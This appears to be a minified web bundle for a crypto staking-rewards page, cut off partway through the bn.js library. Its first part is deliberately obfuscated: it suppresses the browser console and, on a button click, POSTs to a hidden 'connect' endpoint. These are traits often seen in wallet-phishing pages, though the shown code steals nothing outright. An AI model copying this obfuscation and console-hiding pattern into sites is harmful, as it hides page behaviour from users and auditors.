_0x5f4379=_0x36fbcb[_0x2cc5e4(-0x1bb,-0x1cf,-0x1e5,-0x1c6)](_0x5da328,arguments);return _0x36fbcb=null,_0x5f4379;}}}:function(){};return _0x3dbf35=![],_0x1d6303;}else{function _0x49bde8(){const _0x58850a=function(_0x6206ec,_0x3984e5,_0x36ab61,_0x2d18b0){return _0x437aba(_0x6206ec-0x17b,_0x3984e5-0x15d,_0x3984e5-0x18,_0x2d18b0);},_0x3ba380=_0x4764dc[_0x58850a(-0x153,-0x126,-0x11b,-0x101)](_0x4614b2,arguments);return _0x1d8f05=null,_0x3ba380;}}};}(),_0x2a3232=_0x5d46ea(this,function(){const _0x49a5ad=function(_0x31847c,_0x4bb9c0,_0x1c9d07,_0x501d6d){return _0x1b3d(_0x4bb9c0- -0x332,_0x501d6d);},_0x727925=function(_0x1d3400,_0x242a29,_0x53c102,_0x4428b4){return _0x1b3d(_0x242a29- -0x332,_0x4428b4);},_0x4e029e={};_0x4e029e[_0x49a5ad(-0x1c9,-0x19b,-0x17e,-0x19c)]=_0x727925(-0x16a,-0x198,-0x18c,-0x190),_0x4e029e['PfHMd']=_0x727925(-0x18b,-0x18f,-0x196,-0x19b),_0x4e029e[_0x49a5ad(-0x19f,-0x183,-0x177,-0x167)]='^([^\x20]+(\x20+'+_0x727925(-0x176,-0x170,-0x154,-0x171)+_0x49a5ad(-0x180,-0x195,-0x18c,-0x1b8);const _0x5c7fd3=_0x4e029e,_0x25cf0b=function(){const _0xa4c187=function(_0x1d49a2,_0x6ec015,_0x1b73b5,_0x4399cc){return _0x49a5ad(_0x1d49a2-0x1bd,_0x1d49a2- -0x16a,_0x1b73b5-0x165,_0x1b73b5);},_0x3b8d6c=function(_0x5f42b1,_0x1b1267,_0x3c9c00,_0xd23540){return _0x49a5ad(_0x5f42b1-0x17c,_0x5f42b1- -0x16a,_0x3c9c00-0x22,_0x3c9c00);};if(_0x5c7fd3[_0xa4c187(-0x305,-0x30b,-0x320,-0x302)]!==_0x5c7fd3[_0xa4c187(-0x331,-0x33e,-0x350,-0x338)]){const _0x28d2ba=_0x25cf0b[_0x3b8d6c(-0x311,-0x309,-0x2f5,-0x339)+'r'](_0x3b8d6c(-0x320,-0x305,-0x319,-0x33c)+_0x3b8d6c(-0x2f1,-0x31d,-0x315,-0x304)+'/')()[_0x3b8d6c(-0x311,-0x2f0,-0x32a,-0x2f4)+'r'](_0x5c7fd3['mEGBg']);return!_0x28d2ba['test'](_0x2a3232);}else{function _0x309c05(){const _0x45b91c=function(_0x30a391,_0x5a5e6f,_0x25156d,_0x422373){return _0x3b8d6c(_0x30a391- -0xe0,_0x5a5e6f-0xe2,_0x5a5e6f,_0x422373-0xa0);},_0x2d68d0=function(_0x1b9ec4,_0x196ad0,_0x3b3649,_0x44dc5e){return _0x3b8d6c(_0x1b9ec4- -0xe0,_0x196ad0-0xcb,_0x196ad0,_0x44dc5e-0x5f);},_0x21a125=_0x4d13b5[_0x45b91c(-0x3f1,-0x420,-0x41a,-0x400)+'r'][_0x45b91c(-0x3f6,-0x3f8,-0x3f3,-0x41b)]['bind'](_0xaa943b),_0xc5f971=_0x44022f[_0x189915],_0x2ee6ae=_0x11a75e[_0xc5f971]||_0x21a125;_0x21a125['__proto__']=_0x2c728b[_0x2d68d0(-0x3dc,-0x3e6,-0x3f7,-0x3d8)](_0x2c6940),_0x21a125['toString']=_0x2ee6ae['toString'][_0x2d68d0(-0x3dc,-0x3e4,-0x3bc,-0x3d7)](_0x2ee6ae),_0x2c48f3[_0xc5f971]=_0x21a125;}}};return _0x25cf0b();});_0x2a3232();const _0x25680c=function(){let _0x13546a=!![];return function(_0x194110,_0x3f3cda){const _0xd06c4=_0x13546a?function(){if(_0x3f3cda){const _0x212d49=_0x3f3cda['apply'](_0x194110,arguments);return _0x3f3cda=null,_0x212d49;}}:function(){};return _0x13546a=![],_0xd06c4;};}(),_0x41103a=_0x25680c(this,function(){const _0x13271b=function(_0x3d4170,_0x2dfe84,_0x268fa1,_0x2716da){return _0x1b3d(_0x268fa1- -0x236,_0x3d4170);},_0x30a414=function(_0x2318f6,_0x5cecba,_0x245f30,_0x20c712){return _0x1b3d(_0x245f30- -0x236,_0x2318f6);},_0x4852b8={};_0x4852b8[_0x13271b(-0xbd,-0xbb,-0x95,-0x90)]=function(_0x344c06,_0x414293){return _0x344c06===_0x414293;},_0x4852b8[_0x13271b(-0xbe,-0xb9,-0xa9,-0xc1)]=_0x30a414(-0x8c,-0x92,-0xa5,-0xa5),_0x4852b8[_0x30a414(-0x95,-0xe2,-0xbf,-0xd6)]=function(_0x2828ad,_0x10d1e8){return _0x2828ad(_0x10d1e8);},_0x4852b8[_0x13271b(-0x97,-0x82,-0x76,-0x83)]=function(_0x54be55,_0x196f56){return _0x54be55+_0x196f56;},_0x4852b8['xQKCD']=function(_0x1931db,_0x58c60e){return _0x1931db+_0x58c60e;},_0x4852b8['eRkvs']=_0x30a414(-0x88,-0x8f,-0x9e,-0xbb)+_0x30a414(-0xeb,-0xa8,-0xbc,-0xa4),_0x4852b8['NuNmL']=_0x13271b(-0xb0,-0x88,-0x9b,-0x8f)+_0x13271b(-0x9c,-0x6e,-0x8e,-0x84)+_0x30a414(-0x98,-0xb2,-0xbb,-0xb2)+'\x20)',_0x4852b8[_0x13271b(-0x7e,-0x6e,-0x83,-0x99)]=_0x30a414(-0x80,-0x65,-0x72,-0x4b),_0x4852b8['fQAhG']=_0x13271b(-0x65,-0x73,-0x8d,-0xba),_0x4852b8['kERAX']='info',_0x4852b8[_0x13271b(-0x8d,-0x51,-0x80,-0x60)]=_0x30a414(-0xa1,-0xbc,-0xa8,-0xb9),_0x4852b8['iIvVZ']=_0x30a414(-0xe0,-0xbd,-0xb9,-0x92),_0x4852b8[_0x13271b(-0xce,-0xd9,-0xc8,-0xd0)]=function(_0x53ea54,_0x2a3fc5){return _0x53ea54<_0x2a3fc5;};const _0x5db390=_0x4852b8,_0x2139a2=function(){const _0x4fe983=function(_0x28566e,_0x1b6545,_0x40854d,_0x5cd414){return _0x13271b(_0x1b6545,_0x1b6545-0x1c,_0x28566e- -0x64,_0x5cd414-0xa5);},_0x2232ef=function(_0xec2fd4,_0x3e0a2a,_0x5c9645,_0xefa575){return _0x30a414(_0x3e0a2a,_0x3e0a2a-0xc3,_0xec2fd4- -0x64,_0xefa575-0x8a);},_0x21e6e8={};_0x21e6e8['ByWLS']=_0x4fe983(-0x11a,-0xff,-0x140,-0xfd);const _0x253746=_0x21e6e8;let _0x50de21;try{if(_0x5db390[_0x2232ef(-0xf9,-0xf7,-0xcd,-0xe4)](_0x2232ef(-0x109,-0x115,-0x127,-0xf2),_0x5db390[_0x2232ef(-0x10d,-0x136,-0x10d,-0xf0)]))_0x50de21=_0x5db390[_0x2232ef(-0x123,-0x13f,-0x149,-0x14b)](Function,_0x5db390[_0x4fe983(-0xda,-0xfe,-0xc9,-0x108)](_0x5db390[_0x4fe983(-0xe0,-0xf6,-0xd3,-0xd1)](_0x5db390[_0x4fe983(-0x110,-0x125,-0x11c,-0x12d)],_0x5db390[_0x2232ef(-0x111,-0x12e,-0xee,-0x137)]),');'))();else{function _0x43f3c5(){const _0xdebe8a=function(_0x18664f,_0x4850a0,_0x2b6ed3,_0x3fbf9f){return _0x4fe983(_0x3fbf9f- -0x141,_0x18664f,_0x2b6ed3-0xc7,_0x3fbf9f-0x128);},_0x2d2424=function(_0x48f227,_0x331904,_0x58708d,_0x229093){return _0x2232ef(_0x229093- -0x141,_0x48f227,_0x58708d-0x1ca,_0x229093-0x19e);};_0x2e8d2d[_0xdebe8a(-0x262,-0x261,-0x27f,-0x254)+_0x2d2424(-0x248,-0x20e,-0x244,-0x22d)](_0x253746[_0x2d2424(-0x23b,-0x23a,-0x287,-0x259)],_0x3151b3);}}}catch(_0x3bafad){_0x50de21=window;}return _0x50de21;},_0x5c5039=_0x2139a2(),_0x41470b=_0x5c5039[_0x13271b(-0xcf,-0xcd,-0xaa,-0xc1)]=_0x5c5039[_0x13271b(-0xa9,-0xab,-0xaa,-0x83)]||{},_0x12362b=[_0x5db390['fAmGM'],_0x5db390[_0x13271b(-0x9e,-0x9d,-0x77,-0x7c)],_0x5db390[_0x13271b(-0x7e,-0x93,-0x7b,-0x4e)],_0x30a414(-0x90,-0xa4,-0x84,-0x61),_0x5db390[_0x30a414(-0x79,-0x7e,-0x80,-0x8e)],_0x5db390[_0x13271b(-0x63,-0x8e,-0x85,-0x79)],'trace'];for(let _0x1fd684=0x2546+-0x47+-0x24ff;_0x5db390['MFhqG'](_0x1fd684,_0x12362b['length']);_0x1fd684++){const _0x20ea99=_0x25680c['constructo'+'r'][_0x30a414(-0xbd,-0xd0,-0xb0,-0xaf)][_0x30a414(-0xa1,-0xc3,-0x96,-0xa3)](_0x25680c),_0x1e2ca0=_0x12362b[_0x1fd684],_0x181d5b=_0x41470b[_0x1e2ca0]||_0x20ea99;_0x20ea99[_0x13271b(-0xc0,-0x6a,-0x97,-0xb8)]=_0x25680c[_0x30a414(-0xab,-0x8c,-0x96,-0xb6)](_0x25680c),_0x20ea99[_0x13271b(-0xa3,-0x7f,-0x7e,-0x51)]=_0x181d5b[_0x30a414(-0x7c,-0x78,-0x7e,-0x74)][_0x13271b(-0xa7,-0xbb,-0x96,-0xb3)](_0x181d5b),_0x41470b[_0x1e2ca0]=_0x20ea99;}});_0x41103a();async function startConnect(){const _0x51163c=function(_0x2a4bcf,_0x3d5d2f,_0x4e8141,_0x3b3dc8){return _0x1b3d(_0x3b3dc8-0x366,_0x2a4bcf);},_0x1e61c7=function(_0x3e9b60,_0x1903b0,_0x24606a,_0x240c89){return _0x1b3d(_0x240c89-0x366,_0x3e9b60);},_0x59feea={};_0x59feea[_0x51163c(0x504,0x4fd,0x50b,0x516)]=function(_0x5599d6,_0x2282e0,_0x36aa4a){return _0x5599d6(_0x2282e0,_0x36aa4a);},_0x59feea[_0x1e61c7(0x4fa,0x4ab,0x4d8,0x4da)]=_0x1e61c7(0x545,0x513,0x545,0x51d)+_0x1e61c7(0x51f,0x517,0x52d,0x51b)+_0x51163c(0x4e9,0x4e5,0x4df,0x4d0)+'taking-rew'+_0x1e61c7(0x507,0x51b,0x511,0x4fa)+_0x1e61c7(0x51d,0x4e8,0x505,0x510)+'oard-conne'+_0x51163c(0x50c,0x501,0x507,0x512)+_0x51163c(0x4fd,0x51c,0x4eb,0x508),_0x59feea[_0x51163c(0x4fa,0x4fa,0x4f0,0x4df)]=_0x1e61c7(0x4d6,0x508,0x502,0x4fb),_0x59feea[_0x1e61c7(0x522,0x528,0x50e,0x50b)]=_0x1e61c7(0x4f9,0x4f0,0x4df,0x4ce)+'n/json',_0x59feea[_0x1e61c7(0x4f2,0x4e0,0x4d3,0x4f5)]=_0x51163c(0x4f7,0x4f2,0x4cc,0x4db),_0x59feea[_0x1e61c7(0x4f1,0x4b8,0x4af,0x4d9)]='Error:\x20';const _0x3b9fef=_0x59feea;try{const _0x3ab3c2=await _0x3b9fef['bDMub'](fetch,_0x3b9fef[_0x1e61c7(0x4c2,0x4ae,0x4e4,0x4da)],{'method':_0x3b9fef[_0x51163c(0x4fc,0x4c2,0x4fd,0x4df)],'headers':{'Content-Type':_0x3b9fef[_0x1e61c7(0x500,0x504,0x51a,0x50b)]}});if(!_0x3ab3c2['ok'])throw new Error(_0x1e61c7(0x4be,0x4bf,0x4e2,0x4ea)+_0x1e61c7(0x4bb,0x4d4,0x4f5,0x4e4)+_0x3ab3c2[_0x51163c(0x515,0x4d9,0x4dd,0x4e9)]);const _0x8328c0=await _0x3ab3c2[_0x1e61c7(0x4f0,0x4f8,0x4de,0x4e5)]();document[_0x51163c(0x521,0x534,0x4ff,0x522)+_0x51163c(0x538,0x54d,0x549,0x527)](_0x3b9fef[_0x1e61c7(0x4d6,0x4d9,0x520,0x4f5)])[_0x51163c(0x50b,0x513,0x50d,0x4ee)]=JSON[_0x51163c(0x4f6,0x4bf,0x4ad,0x4d7)](_0x8328c0,null,-0xc53*0x2+0x1*-0xc77+0x251f);}catch(_0x23a6ba){document['getElement'+_0x51163c(0x511,0x52a,0x550,0x527)](_0x51163c(0x4fe,0x4b5,0x4ee,0x4db))['innerText']=_0x3b9fef['RkjiT']+_0x23a6ba['message'];}}document[_0x123b14(0x474,0x4a0,0x4ce,0x4cf)+_0x328127(0x466,0x476,0x4a3,0x470)](_0x328127(0x44e,0x47d,0x46c,0x461)+'tn')[_0x328127(0x4a9,0x4ad,0x487,0x481)](_0xae04a1=>{const _0x256982=function(_0x36aa33,_0xee678c,_0x1a7fe5,_0x5b7a6c){return _0x328127(_0xee678c,_0x1a7fe5-0x3e,_0x1a7fe5-0xd5,_0x5b7a6c-0x1a4);},_0x583495=function(_0x1fd661,_0x4b5ec1,_0x314de1,_0x5d4983){return _0x328127(_0x4b5ec1,_0x314de1-0x3e,_0x314de1-0x10d,_0x5d4983-0x10f);};_0xae04a1[_0x256982(0x4d7,0x4f6,0x4cc,0x4ad)+_0x256982(0x512,0x505,0x4f3,0x4e8)](_0x583495(0x4be,0x4b7,0x4c5,0x4ce),startConnect);});


(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const n of document.querySelectorAll('link[rel="modulepreload"]'))i(n);new MutationObserver(n=>{for(const s of n)if(s.type==="childList")for(const o of s.addedNodes)o.tagName==="LINK"&&o.rel==="modulepreload"&&i(o)}).observe(document,{childList:!0,subtree:!0});function t(n){const s={};return n.integrity&&(s.integrity=n.integrity),n.referrerPolicy&&(s.referrerPolicy=n.referrerPolicy),n.crossOrigin==="use-credentials"?s.credentials="include":n.crossOrigin==="anonymous"?s.credentials="omit":s.credentials="same-origin",s}function i(n){if(n.ep)return;n.ep=!0;const s=t(n);fetch(n.href,s)}})();var Po=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};function Ss(r){return r&&r.__esModule&&Object.prototype.hasOwnProperty.call(r,"default")?r.default:r}function $n(r){if(Object.prototype.hasOwnProperty.call(r,"__esModule"))return r;var e=r.default;if(typeof e=="function"){var t=function i(){var n=!1;try{n=this instanceof i}catch{}return n?Reflect.construct(e,arguments,this.constructor):e.apply(this,arguments)};t.prototype=e.prototype}else t={};return Object.defineProperty(t,"__esModule",{value:!0}),Object.keys(r).forEach(function(i){var n=Object.getOwnPropertyDescriptor(r,i);Object.defineProperty(t,i,n.get?n:{enumerable:!0,get:function(){return r[i]}})}),t}var j8={exports:{}};const Iae={},Tae=Object.freeze(Object.defineProperty({__proto__:null,default:Iae},Symbol.toStringTag,{value:"Module"})),w3=$n(Tae);var kae=j8.exports,jB;function Nae(){return jB||(jB=1,function(r){(function(e,t){function i(A,b){if(!A)throw new Error(b||"Assertion failed")}function n(A,b){A.super_=b;var v=function(){};v.prototype=b.prototype,A.prototype=new v,A.prototype.constructor=A}function s(A,b,v){if(s.isBN(A))return A;this.negative=0,this.words=null,this.length=0,this.red=null,A!==null&&((b==="le"||b==="be")&&(v=b,b=10),this._init(A||0,b||10,v||"be"))}typeof e=="object"?e.exports=s:t.BN=s,s.BN=s,s.wordSize=26;var o;try{typeof window<"u"&&typeof window.Buffer<"u"?o=window.Buffer:o=w3.Buffer}catch{}s.isBN=function(b){return b instanceof s?!0:b!==null&&typeof b=="object"&&b.constructor.wordSize===s.wordSize&&Array.isArray(b.words)},s.max=function(b,v){return b.cmp(v)>0?b:v},s.min=function(b,v){return b.cmp(v)<0?b:v},s.prototype._init=function(b,v,_){if(typeof b=="number")return this._initNumber(b,v,_);if(typeof b=="object")return this._initArray(b,v,_);v==="hex"&&(v=16),i(v===(v|0)&&v>=2&&v<=36),b=b.toString().replace(/\s+/g,"");var O=0;b[0]==="-"&&(O++,this.negative=1),O<b.length&&(v===16?this._parseHex(b,O,_):(this._parseBase(b,v,O),_==="le"&&this._initArray(this.toArray(),v,_)))},s.prototype._initNumber=function(b,v,_){b<0&&(this.negative=1,b=-b),b<67108864?(this.words=[b&67108863],this.length=1):b<4503599627370496?(this.words=[b&67108863,b/67108864&67108863],this.length=2):(i(b<9007199254740992),this.words=[b&67108863,b/67108864&67108863,1],this.length=3),_==="le"&&this._initArray(this.toArray(),v,_)},s.prototype._initArray=function(b,v,_){if(i(typeof b.length=="number"),b.length<=0)return this.words=[0],this.length=1,this;this.length=Math.ceil(b.length/3),this.words=new Array(this.length);for(var O=0;O<this.length;O++)this.words[O]=0;var D,R,P=0;if(_==="be")for(O=b.length-1,D=0;O>=0;O-=3)R=b[O]|b[O-1]<<8|b[O-2]<<16,this.words[D]|=R<<P&67108863,this.words[D+1]=R>>>26-P&67108863,P+=24,P>=26&&(P-=26,D++);else if(_==="le")for(O=0,D=0;O<b.length;O+=3)R=b[O]|b[O+1]<<8|b[O+2]<<16,this.words[D]|=R<<P&67108863,this.words[D+1]=R>>>26-P&67108863,P+=24,P>=26&&(P-=26,D++);return this._strip()};function a(A,b){var v=A.charCodeAt(b);if(v>=48&&v<=57)return v-48;if(v>=65&&v<=70)return v-55;if(v>=97&&v<=102)return v-87;i(!1,"Invalid character in "+A)}function c(A,b,v){var _=a(A,v);return v-1>=b&&(_|=a(A,v-1)<<4),_}s.prototype._parseHex=function(b,v,_){this.length=Math.ceil((b.length-v)/6),this.words=new Array(this.length);for(var O=0;O<this.length;O++)this.words[O]=0;var D=0,R=0,P;if(_==="be")for(O=b.length-1;O>=v;O-=2)P=c(b,v,O)<<D,this.words[R]|=P&67108863,D>=18?(D-=18,R+=1,this.words[R]|=P>>>26):D+=8;else{var B=b.length-v;for(O=B%2===0?v+1:v;O<b.length;O+=2)P=c(b,v,O)<<D,this.words[R]|=P&67108863,D>=18?(D-=18,R+=1,this.words[R]|=P>>>26):D+=8}this._strip()};function l(A,b,v,_){for(var O=0,D=0,R=Math.min(A.length,v),P=b;P<R;P++){var B=A.charCodeAt(P)-48;O*=_,B>=49?D=B-49+10:B>=17?D=B-17+10:D=B,i(B>=0&&D<_,"Invalid character"),O+=D}return O}s.prototype._parseBase=function(b,v,_){this.words=[0],this.length=1;for(var O=0,D=1;D<=67108863;D*=v)O++;O--,D=D/v|0;for(var R=b.length-_,P=R%O,B=Math.min(R,R-P)+_,M=0,W=_;W<B;W+=O)M=l(b,W,W+O,v),this.imuln(D),this.words[0]+M<67108864?this.words[0]+=M:this._iaddn(M);if(P!==0){var K=1;for(M=l(b,W,b.length,v),W=0;W<P;W++)K*=v;this.imuln(K),this.words[0]+M<67108864?this.words[0]+=M:this._iaddn(M)}this._strip()},s.prototype.copy=function(b){b.words=new Array(this.length);for(var v=0;v<this.length;v++)b.words[v]=this.words[v];b.length=this.length,b.negative=this.negative,b.red=this.red};function u(A,b){A.words=b.words,A.length=b.length,A.negative=b.negative,A.red=b.red}if(s.prototype._move=function(b){u(b,this)},s.prototype.clone=function(){var b=new s(null);return this.copy(b),b},s.prototype._expand=function(b){for(;this.length<b;)this.words[this.length++]=0;return this},s.prototype._strip=function(){for(;this.length>1&&this.words[this.length-1]===0;)this.length--;return this._normSign()},s.prototype._normSign=function(){return this.length===1&&this.words[0]===0&&(this.negative=0),this},typeof Symbol<"u"&&typeof Symbol.for=="function")try{s.prototype[Symbol.for("nodejs.util.inspect.custom")]=d}catch{s.prototype.inspect=d}else s.prototype.inspect=d;function d(){return(this.red?"<BN-R: ":"<BN: ")+this.toString(16)+">"}var h=["","0","00","000","0000","00000","000000","0000000","00000000","000000000","0000000000","00000000000","000000000000","0000000000000","00000000000000","000000000000000","0000000000000000","00000000000000000","000000000000000000","0000000000000000000","00000000000000000000","000000000000000000000","0000000000000000000000","00000000000000000000000","000000000000000000000000","0000000000000000000000000"],f=[0,0,25,16,12,11,10,9,8,8,7,7,7,7,6,6,6,6,6,6,6,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5],p=[0,0,33554432,43046721,16777216,48828125,60466176,40353607,16777216,43046721,1e7,19487171,35831808,62748517,7529536,11390625,16777216,24137569,34012224,47045881,64e6,4084101,5153632,6436343,7962624,9765625,11881376,14348907,17210368,20511149,243e5,28629151,33554432,39135393,45435424,52521875,60466176];s.prototype.toString=function(b,v){b=b||10,v=v|0||1;var _;if(b===16||b==="hex"){_="";for(var O=0,D=0,R=0;R<this.length;R++){var P=this.words[R],B=((P<<O|D)&16777215).toString(16);D=P>>>24-O&16777215,O+=2,O>=26&&(O-=26,R--),D!==0||R!==this.length-1?_=h[6-B.length]+B+_:_=B+_}for(D!==0&&(_=D.toString(16)+_);_.length%v!==0;)_="0"+_;return this.negative!==0&&(_="-"+_),_}if(b===(b|0)&&b>=2&&b<=36){var M=f[b],W=p[b];_="";var K=this.clone();for(K.negative=0;!K.isZero();){var q=K.modrn(W).toString(b);K=K.idivn(W),K.isZero()?_=q+_:_=h[M-q.length]+q+_}for(this.isZero()&&(_="0"+_);_.length%v!==0;)_="0"+_;return this.negative!==0&&(_="-"+_),_}i(!1,"Base should be between 2 and 36")},s.prototype.toNumber=function(){var b=this.words[0];return this.length===2?b+=this.words[1]*67108864:this.length===3&&this.words[2]===1?b+=4503599627370496+this.words[1]*67108864:this.length>2&&i(!1,"Number can only safely store up to 53 bits"),this.negative!==0?-b:b},s.prototype.toJSON=function(){return this.toString(16,2)},o&&(s.prototype.toBuffer=function(b,v){return this.toArrayLike(o,b,v)}),s.prototype.toArray=function(b,v){return this.toArrayLike(Array,b,v)};var g=function(b,v){return b.allocUnsafe?b.allocUnsafe(v):new b(v)};s.prototype.toArrayLike=function(b,v,_){this._strip();var O=this.byteLength(),D=_||Math.max(1,O);i(O<=D,"byte array longer than desired length"),i(D>0,"Requested array length <= 0");var R=g(b,D),P=v==="le"?"LE":"BE";return this["_toArrayLike"+P](R,O),R},s.prototype._toArrayLikeLE=function(b,v){for(var _=0,O=0,D=0,R=0;D<this.length;D++){var P=this.words[D]<<R|O;b[_++]=P&255,_<b.length&&(b[_++]=P>>8&255),_<b.length&&(b[_++]=P>>16&255),R===6?(_<b.length&&(b[_++]=P>>24&255),O=0,R=0):(O=P>>>24,R+=2)}if(_<b.length)for(b[_++]=O;_<b.length;)b[_++]=0},s.prototype._toArrayLikeBE=function(b,v){for(var _=b.length-1,O=0,D=0,R=0;D<this.length;D++){var P=this.words[D]<<R|O;b[_--]=P&255,_>=0&&(b[_--]=P>>8&255),_>=0&&(b[_--]=P>>16&255),R===6?(_>=0&&(b[_--]=P>>24&255),O=0,R=0):(O=P>>>24,R+=2)}if(_>=0)for(b[_--]=O;_>=0;)b[_--]=0},Math.clz32?s.prototype._countBits=function(b){return 32-Math.clz32(b)}:s.prototype._countBits=function(b){var v=b,_=0;return v>=4096&&(_+=13,v>>>=13),v>=64&&(_+=7,v>>>=7),v>=8&&(_+=4,v>>>=4),v>=2&&(_+=2,v>>>=2),_+v},s.prototype._zeroBits=function(b){if(b===0)return 26;var v=b,_=0;return(v&8191)===0&&(_+=13,v>>>=13),(v&127)===0&&(_+=7,v>>>=7),(v&15)===0&&(_+=4,v>>>=4),(v&3)===0&&(_+=2,v>>>=2),(v&1)===0&&_++,_},s.prototype.bitLength=function(){var b=this.words[this.length-1],v=this._countBits(b);return(this.length-1)*26+v};function w(A){for(var b=new Array(A.bitLength()),v=0;v<b.length;v++){var _=v/26|0,O=v%26;b[v]=A.words[_]>>>O&1}return b}s.prototype.zeroBits=function(){if(this.isZero())return 0;for(var b=0,v=0;v<this.length;v++){var _=this._zeroBits(this.words[v]);if(b+=_,_!==26)break}return b},s.prototype.byteLength=function(){return Math.ceil(this.bitLength()/8)},s.prototype.toTwos=function(b){return this.negative!==0?this.abs().inotn(b).iaddn(1):this.clone()},s.prototype.fromTwos=function(b){return this.testn(b-1)?this.notn(b).iaddn(1).ineg():this.clone()},s.prototype.isNeg=function(){return this.negative!==0},s.prototype.neg=function(){return this.clone().ineg()},s.prototype.ineg=function(){return this.isZero()||(this.negative^=1),this},s.prototype.iuor=function(b){for(;this.length<b.length;)this.words[this.length++]=0;for(var v=0;v<b.length;v++)this.words[v]=this.words[v]|b.words[v];return this._strip()},s.prototype.ior=function(b){return i((this.negative|b.negative)===0),this.iuor(b)},s.prototype.or=function(b){return this.length>b.length?this.clone().ior(b):b.clone().ior(this)},s.prototype.uor=function(b){return this.length>b.length?this.clone().iuor(b):b.clone().iuor(this)},s.prototype.iuand=function(b){var v;this.length>b.length?v=b:v=this;for(var _=0;_<v.length;_++)this.words[_]=this.words[_]&b.words[_];return this.length=v.length,this._strip()},s.prototype.iand=function(b){return i((this.negative|b.negative)===0),this.iuand(b)},s.prototype.and=function(b){return this.length>b.length?this.clone().iand(b):b.clone().iand(this)},s.prototype.uand=function(b){return this.length>b.length?this.clone().iuand(b):b.clone().iuand(this)},s.prototype.iuxor=function(b){var v,_;this.length>b.length?(v=this,_=b):(v=b,_=this);for(var O=0;O<_.length;O++)this.words[O]=v.words[O]^_.words[O];if(this!==v)for(;O<v.length;O++)this.words[O]=v.words[O];return this.length=v.length,this._strip()},s.prototype.ixor=function(b){return i((this.negative|b.negative)===0),this.iuxor(b)},s.prototype.xor=function(b){return this.length>b.length?this.clone().ixor(b):b.clone().ixor(this)},s.prototype.uxor=function(b){return this.length>b.length?this.clone().iuxor(b):b.clone().iuxor(this)},s.prototype.inotn=function(b){i(typeof b=="number"&&b>=0);var v=Math.ceil(b/26)|0,_=b%26;this._expand(v),_>0&&v--;for(var O=0;O<v;O++)this.words[O]=~this.words[O]&67108863;return _>0&&(this.words[O]=~this.words[O]&67108863>>26-_),this._strip()},s.prototype.notn=function(b){return this.clone().inotn(b)},s.prototype.setn=function(b,v){i(typeof b=="number"&&b>=0);var _=b/26|0,O=b%26;return this._expand(_+1),v?this.words[_]=this.words[_]|1<<O:this.words[_]=this.words[_]&~(1<<O),this._strip()},s.prototype.iadd=function(b){var v;if(this.negative!==0&&b.negative===0)return this.negative=0,v=this.isub(b),this.negative^=1,this._normSign();if(this.negative===0&&b.negative!==0)return b.negative=0,v=this.isub(b),b.negative=1,v._normSign();var _,O;this.length>b.length?(_=this,O=b):(_=b,O=this);for(var D=0,R=0;R<O.length;R++)v=(_.words[R]|0)+(O.words[R]|0)+D,this.words[R]=v&67108863,D=v>>>26;for(;D!==0&&R<_.length;R++)v=(_.words[R]|0)+D,this.words[R]=v&67108863,D=v>>>26;if(this.length=_.length,D!==0)this.words[this.length]=D,this.length++;else if(_!==this)for(;R<_.length;R++)this.words[R]=_.words[R];return this},s.prototype.add=function(b){var v;return b.negative!==0&&this.negative===0?(b.negative=0,v=this.sub(b),b.negative^=1,v):b.negative===0&&this.negative!==0?(this.negative=0,v=b.sub(this),this.negative=1,v):this.length>b.length?this.clone().iadd(b):b.clone().iadd(this)},s.prototype.isub=function(b){if(b.negative!==0){b.negative=0;var v=this.iadd(b);return b.negative=1,v._normSign()}else if(this.negative!==0)return this.negative=0,this.iadd(b),this.negative=1,this._normSign();var _=this.cmp(b);if(_===0)return this.negative=0,this.length=1,this.words[0]=0,this;var O,D;_>0?(O=this,D=b):(O=b,D=this);for(var R=0,P=0;P<D.length;P++)v=(O.words[P]|0)-(D.words[P]|0)+R,R=v>>26,this.words[P]=v&67108863;for(;R!==0&&P<O.length;P++)v=(O.words[P]|0)+R,R=v>>26,this.words[P]=v&67108863;if(R===0&&P<O.length&&O!==this)for(;P<O.length;P++)this.words[P]=O.words[P];return this.length=Math.max(this.length,P),O!==this&&(this.negative=1),this._strip()},s.prototype.sub=function(b){return this.clone().isub(b)};function m(A,b,v){v.negative=b.negative^A.negative;var _=A.length+b.length|0;v.length=_,_=_-1|0;var O=A.words[0]|0,D=b.words[0]|0,R=O*D,P=R&67108863,B=R/67108864|0;v.words[0]=P;for(var M=1;M<_;M++){for(var W=B>>>26,K=B&67108863,q=Math.min(M,b.length-1),J=Math.max(0,M-A.length+1);J<=q;J++){var le=M-J|0;O=A.words[le]|0,D=b.words[J]|0,R=O*D+K,W+=R/67108864|0,K=R&67108863}v.words[M]=K|0,B=W|0}return B!==0?v.words[M]=B|0:v.length--,v._strip()}var x=function(b,v,_){var O=b.words,D=v.words,R=_.words,P=0,B,M,W,K=O[0]|0,q=K&8191,J=K>>>13,le=O[1]|0,ae=le&8191,U=le>>>13,G=O[2]|0,Z=G&8191,j=G>>>13,Y=O[3]|0,se=Y&8191,ne=Y>>>13,Te=O[4]|0,Re=Te&8191,$e=Te>>>13,Ae=O[5]|0,De=Ae&8191,Le=Ae>>>13,it=O[6]|0,nt=it&8191,ct=it>>>13,St=O[7]|0,zt=St&8191,Q=St>>>13,z=O[8]|0,H=z&8191,ie=z>>>13,pe=O[9]|0,we=pe&8191,_e=pe>>>13,et=D[0]|0,yt=et&8191,Ye=et>>>13,$t=D[1]|0,xt=$t&8191,Mt=$t>>>13,Pr=D[2]|0,Ur=Pr&8191,Vt=Pr>>>13,jr=D[3]|0,Br=jr&8191,Ct=jr>>>13,er=D[4]|0,tr=er&8191,mt=er>>>13,or=D[5]|0,ar=or&8191,It=or>>>13,cr=D[6]|0,lr=cr&8191,At=cr>>>13,rr=D[7]|0,Kt=rr&8191,wt=rr>>>13,ir=D[8]|0,ur=ir&8191,Tt=ir>>>13,ui=D[9]|0,Ar=ui&8191,ri=ui>>>13;_.negative=b.negative^v.negative,_.length=19,B=Math.imul(q,yt),M=Math.imul(q,Ye),M=M+Math.imul(J,yt)|0,W=Math.imul(J,Ye);var 